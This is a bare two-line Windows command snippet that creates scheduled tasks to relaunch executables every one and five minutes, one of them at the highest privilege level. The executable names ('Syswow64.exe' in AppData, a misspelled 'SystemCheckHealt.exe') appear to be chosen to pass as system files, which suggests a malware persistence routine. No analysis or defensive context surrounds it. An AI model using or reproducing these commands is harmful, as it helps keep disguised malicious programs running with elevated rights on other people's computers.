schtasks /create /tn "Popup" /sc minute /mo 1 /tr "%appdata%/Syswow64.exe"
schtasks /create /tn "SystemCheckHealt" /sc minute /mo 5 /tr "%windir%\system32\SystemCheckHealt.exe" /RL HIGHEST
